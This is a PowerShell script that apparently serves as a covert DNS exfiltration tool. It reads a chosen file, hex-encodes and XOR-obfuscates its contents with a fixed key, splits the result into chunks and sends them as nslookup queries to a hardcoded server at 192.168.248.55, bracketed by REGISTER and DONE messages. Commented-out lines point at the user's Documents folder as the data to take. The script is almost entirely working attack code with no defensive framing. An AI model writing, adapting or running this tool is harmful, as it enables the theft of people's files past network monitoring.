function DNS-send
{
    param ([string] $file)
	#There is no copression in PS<v5 so this is useless just like the useless copress-encode method
	#...
	#$mydoc = [environment]::getfolderpath(“mydocuments”)
	#$temp = $env:TEMP
#Compress-Archive - Path $mydoc -CompressionLevel Optimal -DestinationPath $temp\docs.Zip
    $server = '192.168.248.55'
    $bytes = [System.IO.File]::ReadAllBytes($file)
    $string = [System.BitConverter]::ToString($bytes);
    $string = $string -replace '-','';
    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
    $hash = $hash -replace '-','';
    $filename = Split-Path $file -leaf
    $length = $string.Length; # here
    $split = 50
    $id = 0
    # get the size of the file and split it into chunks
    $repeat=[Math]::Ceiling($length/$split);
    $remainder=$length%$split;
    $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
    $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
    $q = Send-DNSRequest $server $data $jobid
    for($i=0; $i-lt($repeat-1); $i++){
        $str = $string.Substring($i * $Split, $Split); #here
        $data = $jobid + '|!|' + $i + '|!|' + $str
        $q = Send-DNSRequest $server $data $jobid
    };
    if($remainder){
        $str = $string.Substring($length-$remainder); #here
        $i = $i +1
        $data = $jobid + '|!|' + $i + '|!|' + $str
        $q = Send-DNSRequest $server $data $jobid
    };
    
    $i = $i + 1
    $data = $jobid + '|!|' + $i + '|!|DONE'
    $q = Send-DNSRequest $server $data $jobid
};
# a Useless compression method... not used
function Compress-Encode
    {
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $string | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()
        $Compressed = [Convert]::ToBase64String($ms.ToArray())
        return $Compressed
    }




function Send-DNSRequest {
    param ([string] $server, [string] $data, [string] $jobid)
    $data = Xor $data
	$opti = '-retry=0 -timeout=0.1'
	$data = Convert-ToCHexString $data
    $length = $data.Length;
    $key = 't.c'
    $split = 66 - $jobid.Length - $key.Length;
    # get the size of the file and split it
    $repeat=[Math]::Floor($length/($split));
    $remainder=$length%$split;
    if($remainder){ 
        $repeatr = $repeat + 1
    };
    
    for($i=0; $i -lt $repeat; $i++){
        $str = $data.Substring($i*$Split,$Split); 
        $str = $jobid + $str + '.' + $key;

        $q = nslookup.exe $opti $str $server ;
    };
    if($remainder){
        $str = $data.Substring($length-$remainder); 
        $str = $jobid + $str + '.' + $key;
        $q = nslookup.exe $opti  $str $server;
    };
};

function Xor {
    param ([string] $data) 
    $enc = [system.Text.Encoding]::UTF8
    $bytes = $enc.GetBytes($data)
    $key = "3X3SS"
    for($i=0; $i -lt $bytes.count ; $i++)
    {
        $bytes[$i] = $bytes[$i] -bxor $key[$i%$key.Length]
    }
    return [System.Text.Encoding]::ASCII.GetString($bytes)
}

function Convert-ToCHexString 
{
    param ([String] $str)
    $ans = ''
    [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
    return $ans;
}
